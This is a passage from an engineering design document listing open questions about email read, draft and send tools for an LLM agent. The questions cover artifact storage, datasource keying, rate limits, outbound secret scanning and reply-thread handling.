   connection cap); a real taint/provenance gate for co-attached egress.

## Open questions

- **`email_read` artifact placement**: `emails/<folder>/<uid>/` (proposed) vs
  `documents/external/` (where web/citation tooling already scans). Aligning could let email
  bodies be citable via the CitationEngine / job-cloud-export. Charset-normalize saved
  artifacts to UTF-8 (`errors='replace'`).
- **Multiple mailboxes per job**: `datasources_dict` is keyed by *type*, so two email
  datasources on one job collide. v1 = reject a second `email` datasource per job, or key
  connections by datasource id.
- **Rate-limit numbers + outbound secret-scan ruleset** for the send tier (esp. the
  unattended-send path, the main autonomous consumer).
- **Reply discovery**: if evals show the LLM fails to discover reply-via-`reply_to_uid`, is a
  dedicated `email_reply` (drafts at draft tier, sends at send tier) an acceptable 9th tool?
  Parameter-first, dedicated-tool as a measured fallback.
- **Thread reconstruction under a tight allowlist**: a reply in `Sent` with the original in
  `AI` may be an incomplete thread. Is partial-thread acceptable for v1, or must
  `include_thread` search all allowed folders?
